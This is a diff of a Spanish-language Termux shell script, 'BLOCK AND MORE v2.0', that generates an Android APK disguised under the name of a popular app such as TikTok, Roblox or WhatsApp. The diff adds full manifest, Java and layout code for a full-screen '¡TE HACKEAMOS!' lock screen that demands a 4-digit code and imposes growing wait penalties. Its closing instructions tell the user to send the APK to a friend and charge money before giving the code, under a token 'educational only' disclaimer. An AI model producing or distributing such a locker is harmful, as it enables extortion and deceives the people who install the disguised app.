@@ -16,40 +16,25 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v2.0 ]${NC}\n"
 
 # ============================================
-# LISTA DE APPS DISPONIBLES
+# LISTA DE APPS
 # ============================================
 APPS=(
-    "Roblox"
-    "Free Fire"
-    "TikTok"
-    "Instagram"
-    "Facebook"
-    "WhatsApp"
-    "YouTube"
-    "Minecraft"
-    "PUBG Mobile"
-    "Clash of Clans"
-    "Spotify"
-    "Netflix"
-    "Discord"
-    "Snapchat"
-    "Twitter"
-    "Telegram"
+    "Roblox" "Free Fire" "TikTok" "Instagram"
+    "Facebook" "WhatsApp" "YouTube" "Minecraft"
+    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
 )
 
 # ============================================
-# FUNCIÓN PARA MOSTRAR MENÚ PRINCIPAL
+# FUNCIÓN: MOSTRAR MENÚ PRINCIPAL
 # ============================================
-mostrar_menu_principal() {
-    echo -e "${BLANCO}[+] Selecciona una app:${NC}\n"
-    
-    # Mostrar apps en columnas de 4
+mostrar_menu() {
+    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
     for i in "${!APPS[@]}"; do
         num=$((i+1))
-        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-12s${NC}" "$num" "${APPS[$i]}"
+        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
         if [ $((num % 4)) -eq 0 ]; then
             echo ""
         fi
@@ -58,114 +43,346 @@ mostrar_menu_principal() {
 }
 
 # ============================================
-# FUNCIÓN PARA MOSTRAR SUBMENÚ (OPCIONES)
+# FUNCIÓN: GENERAR APK CON CÓDIGO
 # ============================================
-mostrar_submenu() {
-    local app="$1"
-    clear
-    echo -e "${CYAN}==================================================${NC}"
-    echo -e "${VERDE}[✔] App seleccionada: ${BLANCO}$app${NC}"
-    echo -e "${CYAN}==================================================${NC}\n"
-    echo -e "${BLANCO}[+] Opciones disponibles:${NC}"
-    echo -e "  ${AMARILLO}[1]${NC} ${VERDE}BLOCK${NC} - Generar APK de bloqueo para $app"
-    echo -e "  ${AMARILLO}[2]${NC} ${ROJO}Volver al menú principal${NC}"
-    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-}
-
-# ============================================
-# FUNCIÓN PARA GENERAR APK DE BLOQUEO
-# ============================================
-generar_block() {
+generar_apk() {
     local app="$1"
     local codigo="$2"
     
-    echo -e "${VERDE}[✔] Generando APK de bloqueo para: ${BLANCO}$app${NC}"
-    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}\n"
+    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
+    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
+    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
     
-    # Preparar directorios
-    mkdir -p ~/block_phone_temp
-    mkdir -p ~/storage/downloads
-    cd ~/block_phone_temp
+    # Crear carpeta temporal
+    mkdir -p ~/block_temp
+    cd ~/block_temp
     
-    # Descargar APK base
-    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
-    BASE_APK_URL="https://www.dropbox.com/s/ejemplo/block_base.apk?dl=1"
+    # ============================================
+    # CREAR ESTRUCTURA DE LA APK
+    # ============================================
     
-    wget -O base.apk "$BASE_APK_URL" 2>/dev/null
+    # 1. Crear AndroidManifest.xml
+    cat > AndroidManifest.xml << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.block.phone"
+    android:versionCode="1"
+    android:versionName="1.0">
     
-    if [ ! -f "base.apk" ]; then
-        echo -e "${ROJO}[!] Error al descargar la APK base.${NC}"
-        echo -e "${AMARILLO}[!] Coloca manualmente una APK base en:${NC}"
-        echo -e "${AMARILLO}    ~/block_phone_temp/base.apk${NC}"
-        echo -e "${BLANCO}[*] Luego presiona Enter para continuar...${NC}"
-        read
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="APP_NAME"
+        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+        
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleInstance"
+            android:showOnLockScreen="true"
+            android:turnScreenOn="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+EOF
+    
+    # 2. Crear MainActivity.java
+    mkdir -p src/com/block/phone
+    cat > src/com/block/phone/MainActivity.java << 'EOF'
+package com.block.phone;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.os.Handler;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+
+public class MainActivity extends Activity {
+    private EditText codigoInput;
+    private Button desbloquearBtn;
+    private TextView mensajeError, timerText;
+    private Handler handler = new Handler();
+    private int intentos = 0;
+    private int tiempoEspera = 0;
+    private boolean bloqueado = false;
+    private String CODIGO_CORRECTO = "CODIGO";
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
+        
+        codigoInput = findViewById(R.id.codigoInput);
+        desbloquearBtn = findViewById(R.id.desbloquearBtn);
+        mensajeError = findViewById(R.id.mensajeError);
+        timerText = findViewById(R.id.timerText);
+        
+        desbloquearBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if (bloqueado) {
+                    mensajeError.setText("⏳ Espera " + tiempoEspera + " segundos");
+                    return;
+                }
+                verificarCodigo();
+            }
+        });
+    }
+    
+    private void verificarCodigo() {
+        String codigo = codigoInput.getText().toString().trim();
+        
+        if (codigo.isEmpty()) {
+            mensajeError.setText("❌ Ingresa el código");
+            return;
+        }
+        
+        if (codigo.equals(CODIGO_CORRECTO)) {
+            mensajeError.setText("✅ ¡CÓDIGO CORRECTO! Desbloqueando...");
+            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    finish();
+                }
+            }, 2000);
+        } else {
+            intentos++;
+            tiempoEspera = intentos * 60;
+            mensajeError.setText("❌ CÓDIGO INCORRECTO. Espera " + tiempoEspera + "s");
+            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_red_light));
+            codigoInput.setText("");
+            codigoInput.requestFocus();
+            bloqueado = true;
+            iniciarTemporizador();
+        }
+    }
+    
+    private void iniciarTemporizador() {
+        timerText.setText("⏳ " + tiempoEspera + "s");
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                tiempoEspera--;
+                if (tiempoEspera <= 0) {
+                    bloqueado = false;
+                    timerText.setText("");
+                    mensajeError.setText("✅ Puedes intentar de nuevo");
+                    mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
+                } else {
+                    timerText.setText("⏳ " + tiempoEspera + "s");
+                    handler.postDelayed(this, 1000);
+                }
+            }
+        }, 1000);
+    }
+}
+EOF
+    
+    # 3. Crear layout
+    mkdir -p res/layout
+    cat > res/layout/activity_main.xml << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#CC0000">
+    
+    <!-- FONDO CON EFECTO PARPADEANTE -->
+    <View
+        android:id="@+id/blinkView"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="#CC0000" />
+    
+    <LinearLayout
+        android:layout_width="340dp"
+        android:layout_height="wrap_content"
+        android:layout_centerInParent="true"
+        android:background="#FF0000"
+        android:padding="25dp"
+        android:orientation="vertical"
+        android:elevation="15dp"
+        android:border="5dp solid #FFFFFF">
+        
+        <!-- ICONO DE PELIGRO -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text="⚠️"
+            android:textSize="70sp" />
+        
+        <!-- TÍTULO PRINCIPAL -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text="¡TE HACKEAMOS!"
+            android:textColor="#FFFFFF"
+            android:textSize="28sp"
+            android:textStyle="bold"
+            android:layout_marginTop="5dp" />
+        
+        <!-- SUBTÍTULO -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text="⚠️ TU DISPOSITIVO ESTÁ BLOQUEADO ⚠️"
+            android:textColor="#FFFF00"
+            android:textSize="14sp"
+            android:layout_marginTop="5dp" />
+        
+        <!-- MENSAJE DESCRIPTIVO -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text="Este dispositivo ha sido bloqueado.\nPara desbloquear, ingresa el código."
+            android:textColor="#FFFFFF"
+            android:textSize="13sp"
+            android:gravity="center"
+            android:layout_marginTop="15dp"
+            android:layout_marginBottom="15dp" />
+        
+        <!-- CAMPO PARA CÓDIGO -->
+        <EditText
+            android:id="@+id/codigoInput"
+            android:layout_width="match_parent"
+            android:layout_height="55dp"
+            android:background="#FFFFFF"
+            android:hint="CÓDIGO DE 4 DÍGITOS"
+            android:inputType="number"
+            android:textColor="#000000"
+            android:textSize="22sp"
+            android:gravity="center"
+            android:padding="10dp" />
+        
+        <!-- BOTÓN DESBLOQUEAR -->
+        <Button
+            android:id="@+id/desbloquearBtn"
+            android:layout_width="match_parent"
+            android:layout_height="55dp"
+            android:background="#FF0000"
+            android:text="🔓 DESBLOQUEAR"
+            android:textColor="#FFFFFF"
+            android:textSize="18sp"
+            android:textStyle="bold"
+            android:layout_marginTop="10dp" />
+        
+        <!-- MENSAJE DE ERROR -->
+        <TextView
+            android:id="@+id/mensajeError"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text=""
+            android:textColor="#FFFF00"
+            android:textSize="13sp"
+            android:layout_marginTop="10dp" />
+        
+        <!-- TEMPORIZADOR -->
+        <TextView
+            android:id="@+id/timerText"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:text=""
+            android:textColor="#FFFFFF"
+            android:textSize="16sp"
+            android:layout_marginTop="5dp" />
+            
+    </LinearLayout>
+</RelativeLayout>
+EOF
+    
+    # 4. Crear icono (usando una imagen de 1x1 pixel)
+    mkdir -p res/drawable
+    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
+    
+    # 5. Reemplazar el código y el nombre de la app
+    sed -i "s/CODIGO/$codigo/g" src/com/block/phone/MainActivity.java
+    sed -i "s/APP_NAME/$app/g" AndroidManifest.xml
+    
+    # ============================================
+    # COMPILAR CON AAPT Y D8
+    # ============================================
+    
+    echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
+    
+    # Instalar herramientas
+    pkg install aapt dx -y 2>/dev/null
+    
+    # Compilar recursos
+    aapt package -f -m -J src -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar 2>/dev/null
+    
+    # Compilar Java
+    echo -e "${AMARILLO}[*] Compilando código...${NC}"
+    javac -cp ~/android-sdk/platforms/android-33/android.jar -d . src/com/block/phone/*.java 2>/dev/null
+    
+    if [ $? -ne 0 ]; then
+        echo -e "${ROJO}[!] Error al compilar. Asegúrate de tener el SDK de Android.${NC}"
+        echo -e "${AMARILLO}[*] Instalando SDK...${NC}"
+        
+        # Intentar con sdkmanager
+        pkg install sdkmanager -y 2>/dev/null
+        sdkmanager "platforms;android-33" 2>/dev/null
     fi
     
-    # Decompilar
-    echo -e "${AMARILLO}[*] Decompilando APK...${NC}"
-    pkg install apktool -y > /dev/null 2>&1
-    apktool d base.apk -o decoded > /dev/null 2>&1
+    # Crear DEX
+    echo -e "${AMARILLO}[*] Creando DEX...${NC}"
+    dx --dex --output=classes.dex . 2>/dev/null
     
-    if [ ! -d "decoded" ]; then
-        echo -e "${ROJO}[!] Error al decompilar.${NC}"
-        exit 1
-    fi
+    # Empaquetar APK
+    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
+    aapt package -f -M AndroidManifest.xml -S res -I ~/android-sdk/platforms/android-33/android.jar -F app_unsigned.apk . 2>/dev/null
     
-    # Personalizar nombre e icono
-    echo -e "${AMARILLO}[*] Personalizando APK para: ${VERDE}$app${NC}"
+    # Agregar DEX al APK
+    zip app_unsigned.apk classes.dex 2>/dev/null
     
-    # Cambiar nombre en AndroidManifest.xml
-    find decoded -name "AndroidManifest.xml" -exec sed -i 's/BlockPhone/'"$app"'/g' {} \;
-    find decoded -name "AndroidManifest.xml" -exec sed -i 's/Block Phone/'"$app"'/g' {} \;
-    
-    # Descargar icono
-    ICON_URL="https://img.icons8.com/color/96/000000/$app.png"
-    wget -O icon.png "$ICON_URL" 2>/dev/null
-    
-    if [ ! -f "icon.png" ]; then
-        ICON_URL="https://img.icons8.com/color/96/000000/android-os.png"
-        wget -O icon.png "$ICON_URL" 2>/dev/null
-    fi
-    
-    # Copiar icono
-    find decoded -type d -name "drawable*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
-    find decoded -type d -name "mipmap*" -exec cp icon.png {}/ic_launcher.png \; 2>/dev/null
-    
-    # Inyectar código de desbloqueo
-    echo -e "${AMARILLO}[*] Inyectando código: ${VERDE}$codigo${NC}"
-    
-    STRING_FILE=$(find decoded -name "strings.xml" | head -1)
-    if [ -f "$STRING_FILE" ]; then
-        sed -i 's/CODIGO_DESBLOQUEO/'"$codigo"'/g' "$STRING_FILE"
-        sed -i 's/HAS SIDO HACKEADO/🔒 DISPOSITIVO BLOQUEADO/g' "$STRING_FILE"
-        sed -i 's/TU DISPOSITIVO ESTÁ BLOQUEADO/⚠️ CONTACTA AL PROPIETARIO ⚠️/g' "$STRING_FILE"
-        sed -i 's/Ingresa el código de desbloqueo/INGRESA EL CÓDIGO DE 4 DÍGITOS/g' "$STRING_FILE"
-        sed -i 's/Código incorrecto/CÓDIGO INCORRECTO/g' "$STRING_FILE"
-    fi
-    
-    # Recompilar y firmar
-    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
-    apktool b decoded -o final.apk > /dev/null 2>&1
-    
+    # Firmar
     echo -e "${AMARILLO}[*] Firmando APK...${NC}"
-    pkg install apksigner -y > /dev/null 2>&1
     
-    if [ ! -f "debug.keystore" ]; then
-        keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android > /dev/null 2>&1
+    # Generar keystore si no existe
+    if [ ! -f ~/debug.keystore ]; then
+        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
     fi
     
-    apksigner sign --keystore debug.keystore --storepass android --keypass android --out "${app}_block.apk" final.apk 2>/dev/null
+    # Firmar la APK
+    apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
     
     if [ ! -f "${app}_block.apk" ]; then
-        cp final.apk "${app}_block.apk"
+        echo -e "${ROJO}[!] Error al firmar, usando APK sin firmar...${NC}"
+        cp app_unsigned.apk "${app}_block.apk"
     fi
     
-    # Mover a descargas
+    # ============================================
+    # MOVER A DESCARGA Y LIMPIAR
+    # ============================================
+    
     mv "${app}_block.apk" ~/storage/downloads/
     cd ~
-    rm -rf ~/block_phone_temp
+    rm -rf ~/block_temp
     
-    # Mostrar mensaje final
+    # ============================================
+    # MENSAJE FINAL
+    # ============================================
     clear
     echo -e "${CYAN}==================================================${NC}"
     echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
@@ -173,16 +390,22 @@ generar_block() {
     echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
     echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
     echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
-    echo -e "\n${ROJO}⚠️  INSTRUCCIONES:${NC}"
-    echo -e "  1. Envía el archivo a tu amigo."
-    echo -e "  2. Dile que instale la APK."
+    echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
+    echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
+    echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
+    echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
+    echo -e "   ${ROJO}│                                 │${NC}"
+    echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
+    echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
+    echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
+    echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
+    echo -e "  1. Envía el APK a tu amigo"
+    echo -e "  2. Debe instalar la APK"
     echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
-    echo -e "  4. Si se equivoca, espera 1 minuto (se acumula)."
-    echo -e "  5. 💰 Cobra por el código antes de dárselo."
-    echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos."
+    echo -e "  4. Cada error suma 1 minuto de espera"
+    echo -e "  5. 💰 Cobra antes de darle el código"
+    echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
     echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
-    
-    read -p "Presiona Enter para volver al menú principal..."
 }
 
 # ============================================
@@ -197,40 +420,26 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v1.0 ]${NC}\n"
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v2.0 ]${NC}\n"
     
-    mostrar_menu_principal
+    mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
     
     if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
         APP_SELECCIONADA="${APPS[$((opcion-1))]}"
         
-        # SUBMENÚ
+        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
         while true; do
-            mostrar_submenu "$APP_SELECCIONADA"
-            read -p ">> Selecciona una opción (1-2): " subopcion < /dev/tty
-            
-            if [ "$subopcion" == "1" ]; then
-                # Generar BLOCK - Pedir código
-                echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
-                while true; do
-                    read -p ">> Código (1000-9999): " CODIGO < /dev/tty
-                    if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
-                        break
-                    else
-                        echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
-                    fi
-                done
-                
-                generar_block "$APP_SELECCIONADA" "$CODIGO"
-                break
-            elif [ "$subopcion" == "2" ]; then
+            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
+            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                 break
             else
-                echo -e "${ROJO}[!] Opción inválida.${NC}"
-                sleep 1
+                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
             fi
         done
+        
+        generar_apk "$APP_SELECCIONADA" "$CODIGO"
+        read -p "Presiona Enter para continuar..."
     else
         echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
         sleep 2
